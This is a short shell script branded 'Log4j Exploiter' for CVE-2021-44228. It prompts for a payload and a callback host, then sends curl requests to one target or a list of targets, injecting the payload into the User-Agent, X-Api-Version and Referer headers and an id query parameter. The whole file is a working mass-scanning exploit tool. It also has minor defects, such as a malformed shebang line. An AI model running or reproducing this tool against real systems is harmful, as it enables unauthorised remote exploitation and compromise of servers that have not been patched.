#1/bin/sh

# Colors
blue='\e[1;34'
cyan='\e[1;36m'
green='\e[1;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

# Banner
banner(){
    clear
    echo -e "$white"
    echo -e "   ▄▀ ▄▀     "
    echo -e "    ▀  ▀     "
    echo -e "  █▀▀▀▀▀█▄  $cyan Log4j Exploiter$white"
    echo -e "  █░░░░░█─█  CVE-2021-44228"
    echo -e "  ▀▄▄▄▄▄▀▀   "
    echo -e ""
}

payload(){
    banner
    read -p " payload : " payload;
    read -p " collab  : " collab;
}

exploit(){
    banner
    target=$1
    echo -e "$yellow //$white Exploiting$cyan $target$white"
    echo -e ""
    echo -e "$cyan  [+]$white Payload$red :$white $payload"
    echo -e "$cyan  [+]$white Collab$red  :$white $collab"
    echo -e ""
    curl -k -g -A "$payload.$collab/a" -H "X-Api-Version: $payload.$collab/a" --referer "$payload.$collab/a" "$target?id=$payload.$collab/a"
}

banner
echo -e "$cyan  01$red :$white Single Target"
echo -e "$cyan  02$red :$white Multi Target"
echo -e ""
read -p " Select one : " menu;

payload

if [ $menu == 1 ]
then
    banner
    read -p " target : " target;
    exploit $target
elif [ $menu == 2 ]
then
    banner
    read -p " list : " list;
    while read target;
    do
        exploit $target
    done < $list
fi